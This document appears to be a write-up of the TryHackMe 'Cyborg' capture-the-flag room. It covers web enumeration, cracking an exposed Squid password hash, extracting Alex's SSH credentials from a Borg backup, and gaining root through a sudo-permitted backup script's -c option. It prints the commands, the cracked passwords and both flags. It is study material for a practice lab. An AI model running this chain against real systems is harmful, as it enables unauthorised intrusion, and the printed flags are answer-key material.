# TryHackMe — Cyborg

> **A Linux privilege-escalation walkthrough covering web enumeration, exposed configuration files, password hash cracking, Borg Backup, and sudo misconfiguration.**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-Web%20Enumeration%20%7C%20Borg%20Backup%20%7C%20Privilege%20Escalation-blue)
![Target](https://img.shields.io/badge/Target-Linux-orange)

## Overview

This write-up documents my walkthrough of the **Cyborg** room on TryHackMe, based on the screenshots provided in the ZIP archive.

The attack path begins with web enumeration. An exposed Apache directory reveals Squid proxy configuration and a password hash. After cracking the hash, the recovered password is used to access a Borg backup archive. The backup contains credentials for the `alex` account. After gaining SSH access, a root-executable backup script is found to accept a command-line argument that can be executed with elevated privileges.

## Attack chain

``` text
Nmap enumeration
      |
      v
Gobuster discovers /admin and /etc
      |
      v
Inspect /etc/squid/ and recover password hash
      |
      v
John cracks hash -> squidward
      |
      v
Download and inspect Borg backup archive
      |
      v
Extract archive -> discover alex credentials
      |
      v
SSH as alex -> user flag
      |
      v
sudo -l -> NOPASSWD backup.sh
      |
      v
Abuse -c option in backup.sh
      |
      v
Execute command as root -> root flag
```

## 1. Enumerate the target

Start with an Nmap service and version scan:

``` bash
nmap -sV -sC <TARGET_IP>
```

The scan in the screenshot identifies:

        Port Service   Finding
  ---------- --------- -------------------------------
    `22/tcp` SSH       OpenSSH 7.2p2 on Ubuntu
    `80/tcp` HTTP      Apache httpd 2.4.18 on Ubuntu


<img width="818" height="378" alt="1" src="https://github.com/user-attachments/assets/606dc7f6-f659-4e5f-945b-260b2e5c8fd3" />

## 2. Inspect the website

Open the target in a browser:

``` text
http://<TARGET_IP>/
```

The web server displays the default Apache2 Ubuntu page.


<img width="972" height="461" alt="2" src="https://github.com/user-attachments/assets/06c0f0eb-caa7-4c71-9eac-8f175cfd74be" />

Enumerate web directories with Gobuster:

``` bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

The scan discovers `/admin/` and `/etc/`.

<img width="925" height="313" alt="3" src="https://github.com/user-attachments/assets/55e36e53-b6da-43b8-9825-561dab3b778c" />

## 3. Explore the admin page and exposed configuration files

Open the discovered admin page:

``` text
http://<TARGET_IP>/admin/
```

The page contains an admin area with a shoutbox. One message mentions that Alex has been experimenting with a Squid proxy and that configuration files may have been left exposed.

<img width="1249" height="614" alt="4" src="https://github.com/user-attachments/assets/7b791bb4-3396-4bdf-8ccf-e2a9c465d945" />

Browse the exposed `/etc/` directory:

``` text
http://<TARGET_IP>/etc/
```

The directory listing contains a `squid` folder.

<img width="748" height="321" alt="5-1" src="https://github.com/user-attachments/assets/5371bd05-cda5-4d63-bb43-5f125a3fb642" />

Open the Squid directory:

``` text
http://<TARGET_IP>/etc/squid/
```

The listing exposes `passwd` and `squid.conf`.

<img width="794" height="336" alt="5-2" src="https://github.com/user-attachments/assets/545d5eef-0900-4232-bf7e-0038f0cbea8b" />

Inspect `squid.conf`:

``` text
http://<TARGET_IP>/etc/squid/squid.conf
```

The configuration shows that Squid uses Basic Authentication and references `/etc/squid/passwd` for credentials.

<img width="709" height="225" alt="5-3" src="https://github.com/user-attachments/assets/af205d50-3013-47e2-9561-d34b3795c6b0" />

Open the password file:

``` text
http://<TARGET_IP>/etc/squid/passwd
```

It contains a password hash for the `music_archive` account:

``` text
music_archive:$apr1$BpZ.Q.In$FOqqPwHSOGSOURUOVOTT
```

<img width="694" height="135" alt="5-4" src="https://github.com/user-attachments/assets/b8e4518d-f30e-495e-a94a-ed218238893e" />

## 4. Crack the exposed password hash

Copy the hash into a local file:

``` bash
nano hash
```

Run John the Ripper with the `rockyou.txt` wordlist:

``` bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The screenshot shows the recovered password:

``` text
squidward
```

<img width="784" height="246" alt="5-5" src="https://github.com/user-attachments/assets/ca340c77-6d69-437e-bfb0-8e16106d5db8" />

## 5. Download the Borg backup archive

Return to the admin page and open the **Archive** section. Use the
download option shown in the screenshot to download the backup archive.

**Screenshot --- Archive download option**

![Archive download option](images/click_on_download.png)

The downloaded file is named `final_archive`. The screenshot shows the
archive's contents and identifies it as a Borg Backup repository.

**Screenshot --- Downloaded archive contents**

![Borg archive files](images/inside-of-download-zip.png)

## 6. Inspect and extract the Borg archive

Create a working directory and inspect the archive:

``` bash
mkdir archive
cd archive
borg list ../final_archive
```

When prompted for the repository passphrase, use the recovered password
from the previous step:

``` text
squidward
```

The archive listing shows a backup named `music_archive`.

**Screenshot --- Borg archive listing**

![Borg list](images/7.png)

Extract the backup:

``` bash
borg extract ../final_archive ::music_archive
```

Enter the same passphrase when prompted.

**Screenshot --- Borg extraction**

![Borg extract](images/8.png)

Inspect the extracted directory structure:

``` bash
cd home/alex
ls
```

The backup contains Alex's home directory and several personal files.

**Screenshot --- Extracted home directory**

![Extracted Alex home](images/9.png)

## 7. Discover Alex's credentials in the backup

Read the files recovered from the archive:

``` bash
cat Desktop/secret.txt
cat Documents/note.txt
```

The note explains that Alex writes passwords down because he has trouble
remembering them. It contains the SSH credentials:

``` text
alex:S3cretP@s3
```

**Screenshot --- Recovered credentials**

![Credentials in backup](images/9.png)

## 8. SSH as Alex and retrieve the user flag

Connect to the target:

``` bash
ssh alex@<TARGET_IP>
```

Use the password recovered from the Borg backup:

``` text
S3cretP@s3
```

The screenshot confirms a successful SSH login as `alex`.

**Screenshot --- SSH login**

![SSH as Alex](images/10.png)

List the home directory and read the user flag:

``` bash
ls
cat user.txt
```

The user flag shown in the screenshot is:

``` text
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

**Screenshot --- User flag**

![User flag](images/11.png)

## 9. Check sudo permissions

Check which commands Alex can execute with elevated privileges:

``` bash
sudo -l
```

The output shows that Alex can run the backup script as any user without
entering a password:

``` text
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

**Screenshot --- Sudo permissions**

![Sudo permissions](images/12.png)

Inspect the script:

``` bash
cat /etc/mp3backups/backup.sh
```

The script processes a `-c` option using `getopts` and stores its
argument in a variable named `command`. The script later executes that
variable. Since the script is allowed to run through `sudo`, this option
creates a command-execution path with elevated privileges.

**Screenshot --- Backup script source**

![Backup script](images/13.png)

The backup directory and its file list can also be inspected:

``` bash
ls -l /etc/mp3backups/
cat /etc/mp3backups/backup_files.txt
```

The screenshot shows the backup file list and the backup archive output.

**Screenshot --- Backup directory and file list**

![Backup files](images/14.png)

## 10. Confirm the command execution path

Run the script through the permitted sudo rule and pass a harmless
command to its `-c` option:

``` bash
sudo /etc/mp3backups/backup.sh -c whoami
```

The screenshot records this test and shows the script's backup output.

**Screenshot --- Testing the `-c` option**

![Command execution test](images/16.png)

## 11. Read the root flag

Because the script executes the supplied command with root privileges,
pass a command that reads the root flag:

``` bash
sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt'
```

The screenshot shows the command and its output at the end of the backup
script execution:

``` text
flag{Than5s_f0r_play1ng_H0pe_y0u_enJ053d}
```

**Screenshot --- Root flag**

![Root flag](images/17.png)

## Flags

  Flag   Value
  ------ ---------------------------------------------
  User   `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
  Root   `flag{Than5s_f0r_play1ng_H0pe_y0u_enJ053d}`
